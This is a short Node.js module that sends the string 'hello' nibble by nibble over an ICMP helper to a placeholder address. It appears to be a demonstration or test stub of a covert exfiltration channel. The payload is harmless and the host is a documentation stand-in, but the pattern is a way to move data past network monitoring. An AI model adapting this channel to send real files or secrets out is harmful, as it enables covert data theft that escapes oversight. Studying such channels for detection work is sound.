const fs = require("fs");
const {icmpNibble} = require("./channels");
function send() {
 const data = Buffer.from("hello");
 for (const byte of data) {
  icmpNibble("203.0.113.7", byte >> 4);
  icmpNibble("203.0.113.7", byte & 15);
 }
}
module.exports = {send};
